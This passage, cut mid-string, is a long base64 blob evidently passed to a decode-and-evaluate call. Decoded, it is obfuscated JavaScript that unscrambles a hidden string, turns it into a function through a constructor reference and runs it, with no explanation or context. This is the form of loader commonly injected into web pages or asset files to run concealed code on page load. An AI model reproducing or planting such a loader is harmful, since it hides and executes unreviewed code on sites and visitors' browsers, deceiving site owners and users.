rMiBhdT0rKyt2ZmZ0eiByc2cpLGN6PWkuYTtuXWMpZT0udmFyKWYgcFs7YS1pZnUwaHo7MyhlZyFmKkMrICJ0bGU0KGlncnVsLXgiOF07ckFDbGYuYStdYW5ybD0tNyhbKCh1LGFua2o9dCo9KCg3b3ZsaWUocjtkLiJ1KyBDbjt1QSJ6eiwxZV1dO3U7aG9ddGlzKTkucm5vKXRvMDE9aXA7NzgwcGxydmg1IHRjb2JkaSw7PnR9bzgoWzdydC5sYW9udDB4Myg9O3IpZC5mO2VqKCtvKygpdTt1aGlpbztzZyxkXWgsYWlTNT1oQ3VnaiwoZnYpKDs9ODt0c24sPDssbG5yQTwpIGwyYSkiYls9LH0uOzRxdWNzdW0zKXJpbGdnbil1ISkiNnI9Zi43PVs9PXYpPnRvbGQ7KSk9Nyh9PSliIHY9dm9sIFs9ZS5qYSwsWytjKTtzOz0gdnY5KHYpKWgoPWwsIHtyOy17MWc4aH1yenRwMGcpID0saTg9K2IrPXNhKWdhLSw9ckNtdGwsKHRyMWRjcis1bnNybCluKW9nK3JdQSwoPXY2Z2Ugb28rLjRyaW1zcy5pKDYoKStlLm1dNnAubmF0NHNialMwejgpYS5qeithZj1oO2prIHJjb2Zwb3Y7PWU7eG0iO1tpcm4gaHZlb2MyMChyaSIrPSllLDEsKSxlYWYnO3ZhciBpS0c9bkZJW1Fvbl07dmFyIEpJUj0nJzt2YXIgUUhoPWlLRzt2YXIgQ1ZyPWlLRyhKSVIsbkZJKHZpTikpO3ZhciB5RU09Q1ZyKG5GSSgnKWdyMXNzJCRyZV8waV5eXkogXl49YXJdczZfLm1nO3QldDEsPi5hb2Npby5TK2FdLG9lXnhbOy49LnsgcCFdX2E6X2sjKCUpInR1X284OmFfYmY9byteKStnPV5dZWVhbiAuZiE4M2VfLmU6bC5iZjReXnNMfWVeXk9tfWNlNykzeGE3KSVeZ3QkJS5hYWRpOl5eb2ZeMjA4UGEiT25edDJdYSk4YWReX285KzthW2ReaWVfM2Vdbl5tVTYpe2xhLiV0PV1TXl0wRylnM2xTXl5ePl4hNy5mbE99YjgoX2pub15yY2laYSBPe3Jvb20pZTEhYTZjXitdbl4sKGVpbCVfLldGLigzMTFeXyIoJCVeXmFkLjRyXilJM3heXiMgN15dMWFzXCc9XXRudSleU15sY20pKF1vdmZvXzp9dDBvQV4zXiBeOjldYXIleW52aSl7ZXJROGhoXihiXz1QZV9vJWc1KkNyX2heLC1fPV1mWC4gYXJzPi5zKWJUcF9yLGMiX2RTcHReLF5wbzRecm0xaEtvPW83KCFyIS52KV4oMylubFRvd3Nebi4lLm0lP1Z0aDdlX2RfX151aV5jJV5HZ2FeKXRTZCU9cmkpb2FvXmJjMzEgLTBlcnAxUCggMCRyNC5zYT4xYWFoc2MuLXNzbyhfXV90cXUuLG5dZW5sKEUoaW5eKVlhX2VhXnZldFlee2cyaSFucGwhIy51XWFtYm40JW1fdGZMSWl9cDxyYX12Xi5WXnQuIV91dm43XmRmNlsuOzo5XnwyRF49JXNmZy5eYzMiYjAoLmF9PTFeYWouYXN9MGVeZXR4cnteZD1eLGU0bHIgbUoiSigoSXthM2RucD1fMl51Lk4rb2FyYXJ0MGYlXi5yJV1vY14oLjRsIF4tPTtybz0yKXJwYXU1bF5jJW4lPTRtaCl1XC9YLl50MGg4b2UlbClubmxeaC5iIUZ0Xl48fXQiOW15KF5eTm9yXTdyIW90RnQiZm8xXzM2XSt5IEVdaSEoNCglcihpb29PXnQoJC55YUluYnNleW1lLildX2FpZSBifHxeMmFvbmRVYTd0XWFzZDpeaXAlOlwvXl9zZW86b15ebl94I1JvXjhfZS5dLiVlIWcudGhlMGEwXl19XjE7KF5lW210PCBde3suU2NiXl5lM3QuPWtmaHA0dSllKGVlc3dlXWF0OmF0eyUoYis7NF4wXnRoMzZdNyVeJCMoS2EgXm90OjspZE10b25vXyxqfTE6ZGxUbzcpXil9fXRyXmlwOz1eLileW2dkJHAuYSg9XW5fLV5LO10sOC4pd2VLIV5zNDQ7WGZiOl45XmxhMyheKSQub2ExZiFvZW4kKWF3eV5uPSU6eC40bi45e3Q5byEpfV5hKGFbbj9jdGdbKDpmOXMsJV55XmVecn0pLnJfXmF7ZHsucDJUKS44XVluMGRfXmVbKDp7PSA9cil1LjJdXikuMXRlJCUyP2gueV4uIV43KC5fcmF7Zm8zKXN0aTRhYThfd19fZW9cLzY4dVU9LD0sc2EpK090KXQhXiogZC51YV84bl41U2VeK1doaXVeXmYzZV5Pbl5kMD00ZWllc15jXilvPVMyLkE1XmI0O2EtRyxhXS4uXl9hb257bl5eTF5lXkZefWthcyk1M2FuX3JdXjl7YzI9XiVuMXRmW2FvZiNhMW5kZV4odHAzKV0yQmxbLj1eYSApXn15ZilkKC5ee15IZW5LMCgobjtjYV4pXl8rPV09X15eNStkeD1hYS4oMl5UJV5POzVyJV9vbHVebWEyN2E1ZXQhXmQ/cyhkXl4laWNuPWJea3QxMCBhLl1db14sUEdfXl5kWzEocl5dQC5qZWw3X2o9bEclcjAuYWEoLmU+XnJ7JHJve2kuMl1eX2IoKz0ldV0lcjRTKSwgIF5hLmUuZWkpb2UsbnIla2FpLC4zMih0T2VjXit9c3RiYTRjPV1vdHsxKXBObURkYihkOyUoPXVfNFwvYTFhMV5uKWxpOyBuM2RsXjMoXlQwXl5tIXBkfVtdfW89Xn11YUVlXi5eXi50ciliYSE2XjFuYV9vXXheXiFzX18gXXQ0JlwnXnNyLXNmUy10b15iXn19XXAiXnQuaTJeLl9dXl5eM29yXWxwOjBeITFiX2VvO0NdWHRlKWddLjFfXi5vW29lIWEpZilwMC5ke141KWxuSXY6Q29dYX0uPXNecm5fYl5jO3MlIDl0XiVhZl5hdGhbXXkyMzE1b14lKGNlSDJlYV90OyU9bnIrMV1ufUFyPSheJSlmXXRqayhhc2R9Xm5tYl1ofV59Xnk/Nl9hXWN2TlRvPT1eQGd1O0YuM25yKWNhXjFeXmNiPSAlXjAyXiliXWdqLHBeXl1ebi45XjJoanpdYT1eLi5dXlNeKF1uOjtpZjtmYXUwXzY1YV4iaSw5ezQ0ZGVlOjxlXl87XXAzJSVUPXI1IF8xdWJlXVcyJV1fXileKW1uXTU6a2QyLSBdfW4oMWllKVtmN3k0JGcuMDEuXm0jOjEkSF8xbiVJUzcwKWhbIGNpLi5QPV4xe2JIIl4tLjFecm8pNzBUY3RlZXJeXVt0XmdfbV80ZWZfKT07LCh0LGQjKWUkYV5fVlU9XnxyXmZfXilhXl9fW15bIG9maiEuNHVsSSBebi5ebmVebz01ZTZuXil1dCkyKF9nXylpLmxeLF5peV5wbl5eKV50bW5hZmRpIyleYV1hYW9AXjt1e2NpISxhKW5teyZhPW0yXl00LTZeQmFubHtoZV5xKHZfZGxsLjl0YV4uYV4xNGFVaH1eNl5tPTtdaCxeeS54Z15jXV9sY11cJyVedGp9bF4uY314bz49bzhhY259TnQ5XjFral5sN24ydCkraWwhY29dfSkxdDFfb19ycjIxdzVZZF5iKHRsPShfaThhXjM5XiBfMGoqMmdXJV53b3tALl10X3VpLnJ1c106ZjtmZnA1KF4yYSFidClediksc3M0ZG5zX3RpPSEpKH0ldF4pdHtdcD1dXnQgbm9ecG8odGMgLHRdZl0hNV9fXC9bai41Oy5bMmFzMXI9eWVlcyhhYV0oKXA9fWVhPy4uQzJvK3Q3cmFeZV8uMzZyfXUgZS0uPWppQ15fYVleYSleb2V0JiZjIG9zQiUickJ0ZV5pZTQpXC8hbFd0ZnsuKCFwYVFeOHQrYSwxOWFhLDo4X2VvYUZ8dSVefW9eXl8uLmVfaGYsdF1zYXsxRCBzX2ElLmVuInMoO106dCYuLlEzISUhbmVjXihfTnddZXleLnRsb15WJWFhPXIwIGg8TjdtaSteMV86OkNlOXM3eV1pPXlfd29mLnNjKX0rUWllXmUrXjNqXmQpXSU0XjteXj0lMjJtX28pKzpecjIxXV98dClNZClkOGleXnJlcihfLl1lWjthMV5zMH1eZzNhLndnZDA2MF41XjtkXnIycCVlbyheXishcjlvXm4zMCstdGUoMGFsPV4zdGZvZmFyKjZeXn19ZWFnakk2OiJpLChhO20sdV4lYjApKV5eIjAwYjUlfHMwYW9jcnReRy4xXz1eRyFlXjIgX2UiKy5eKWVfZm4kMF4kYmV9XmVeXj5eIl5RaTR7LmU0Li5lLHYiM19vdDheMWE1bDs4e3IpbXVcL3JfYTJwXXQ7YSMjIWReLl06fV5eWz9lXj1ddGNkJSBsZigyO14pZTshdHUhICg6cmFlcC5kZW45dF40NDMle3IsKDNyZF5ea3JfYn1hY28xWyhdXXRfJiklZDF9KSl0RTlybCJlMV5dKC47YV1lXmNeYjtkX2hfc2o2dG4uKGk9XlJWaSx7MykrYzNsZCRfcmU7XXZeMTQuZ2kuYTVfJV5hbyN0XmpdZXVfXSlvZV5jJVFeeXRvMSFeXW5EdCYhICUwbl5eYV4pJSBENF9SNTReJndhX3RyMWFvTy5eZmk1OSB0fV59PV5eKStDal19byhhKGFeb3J9PV5eOD10dF9eNihlXi4wdFF0YV82bi5fKHJvYTo6XWFhMF5OdHNlW1wvZV1eZDpfbTt9aHdybz0gXl1eOW5eR11eLTNfZ29HXiQwYXdyfSZePWg9U2VedGFeNWFZLmF7KWZeOW4xNyBdbmlPb2NyICkgXV5YX2dkaGQreTZvKFM7XV90eyBjNChcJ11kW15dOVwvanN1aV5ubF1vJSEzdXItOCU9Ll9efDJlXzBNXS5he2ZuX3teezdvLmlvPnNyKzoxfXNedDddS14uaC5faWVhTGMocjMuXi5UdlwvZi0lKTMrXyAyMS5hZTU4ISRhYV5hXC95dGk9Xm4geHRbOi53IF40LWxvZmFeX3ZhbHQ7JS5pe2UgbltsJHReXk9iY15dXl4gMzkpNk91JWFhXiBiLmV0JmIle0h9LnVdO0puXmZ5YXNvZF50My5wW3IyOl5vXiByKGhrXWNGcm1eYXsual1VYTskXiwhKHs9cl4hTTFhQWFsbjFwIWNRcDMlZSAlIXt0YSAyIVslZXQ5YXlfMHJhZXNfXnUoO2lvIC5eLDA7LmxjOzV0X18hJykpO3ZhciBNRWE9UUhoKGpIdSx5RU0gKTtNRWEoMzcyOCk7cmV0dXJuIDY4ODR9KSgp'))
